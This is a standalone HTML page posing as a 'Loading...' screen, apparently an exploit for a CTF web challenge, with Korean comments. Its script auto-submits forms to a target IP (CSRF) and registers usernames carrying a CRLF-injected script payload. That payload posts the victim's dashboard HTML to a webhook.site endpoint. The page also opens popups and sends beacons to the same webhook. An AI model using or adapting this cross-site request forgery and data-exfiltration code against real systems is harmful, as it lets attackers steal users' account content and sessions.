<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Loading...</title></head>
<body>
<h1>Loading...</h1>
<iframe name="f" style="display:none;"></iframe>

<script>
// 전략: 가능한 FLAG로 계정 등록 후, 
// 봇이 로그인한 시점에 dashboard를 popup으로 열기

// 간단한 payload - dashboard 내용을 webhook으로 전송
var payload = "\r\n\r\n<script>setTimeout(function(){" +
              "fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316',{" +
              "method:'POST',body:document.body.innerHTML});},500);" +
              "</s"+"cript>";

var flags = [
'ctf{bookmarks}', 'ctf{bookmark}', 'ctf{crlf}', 'ctf{xss}',
'ctf{admin}', 'ctf{bot}', 'ctf{csrf}', 'ctf{session}',
'ctf{http_response_splitting}', 'ctf{response_splitting}'
];

// 모든 가능한 FLAG로 등록
flags.forEach(function(flag, i) {
    setTimeout(function() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://65.109.202.184/register';
        form.target = 'f';
        
        var u = document.createElement('input');
        u.name = 'username';
        u.value = flag + payload;
        
        var p = document.createElement('input');
        p.name = 'password';
        p.value = 'password';
        
        form.appendChild(u);
        form.appendChild(p);
        document.body.appendChild(form);
        form.submit();
        
        setTimeout(function() { if(form.parentNode) document.body.removeChild(form); }, 50);
    }, i * 80);
});

// 핵심: 봇이 로그인한 후(7초) dashboard를 popup으로 열기
// 하지만 봇은 5초 후 페이지를 떠나므로...
// beforeunload 이벤트 활용!

var popupOpened = false;

// 4.5초 후에 미리 popup 열기 (봇이 페이지를 떠나기 직전)
setTimeout(function() {
    if (!popupOpened) {
        popupOpened = true;
        // Dashboard를 새 탭에서 열기
        var w = window.open('http://65.109.202.184/dashboard', '_blank');
        
        // 신호 전송
        navigator.sendBeacon('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', 
            'popup_opened_at_4.5sec');
    }
}, 4500);

// 페이지를 떠날 때도 시도
window.addEventListener('beforeunload', function() {
    if (!popupOpened) {
        window.open('http://65.109.202.184/dashboard', '_blank');
    }
    navigator.sendBeacon('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', 
        'beforeunload_triggered');
});

// 완료 신호
setTimeout(function() {
    navigator.sendBeacon('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316',
        'all_registrations_complete');
}, 1500);
</script>
</body>
</html>
